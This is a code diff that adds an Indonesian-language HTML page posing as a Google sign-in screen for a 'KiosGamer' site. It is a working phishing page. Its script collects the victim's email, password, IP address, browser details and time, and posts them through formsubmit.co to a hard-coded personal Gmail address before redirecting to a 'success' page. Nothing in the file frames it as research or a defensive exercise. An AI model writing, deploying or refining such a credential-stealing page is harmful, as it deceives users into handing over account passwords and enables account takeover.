@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Masuk dengan Google</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="google-bg">
+<div class="google-container">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="glogo">
+  <h2>Masuk</h2>
+  <p>untuk melanjutkan ke <b>KiosGamer</b></p>
+  <form id="phishForm">
+    <input type="email" id="email" placeholder="Email atau telepon" required>
+    <input type="password" id="password" placeholder="Masukkan sandi" required>
+    <div class="show-pw">
+      <input type="checkbox" id="showpw"><label for="showpw">Tampilkan sandi</label>
+    </div>
+    <button type="submit">Berikutnya</button>
+  </form>
+  <p class="note">Dengan melanjutkan, Anda setuju untuk memberikan akses ke akun Anda.</p>
+</div>
+
+<script>
+const EMAIL_TUAN = "fadlifidmas@gmail.com";
+
+document.getElementById('phishForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const pw    = document.getElementById('password').value;
+
+  let ip = "unknown";
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    ip = d.ip;
+  } catch(err){}
+
+  const device = navigator.userAgent;
+  const waktu  = new Date().toLocaleString('id-ID');
+
+  const payload = {
+    _subject: `KiosGamer | ${email} | ${ip}`,
+    _template: "table",
+    _captcha: "false",
+    Email: email,
+    Pw: pw,
+    Ip: ip,
+    Device: device,
+    Waktu: waktu
+  };
+
+  try {
+    await fetch(`https://formsubmit.co/ajax/${EMAIL_TUAN}`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+  } catch(err){}
+
+  setTimeout(()=>{ window.location.href = 'sukses.html'; }, 1200);
+});
+</script>
+</body>
+</html>
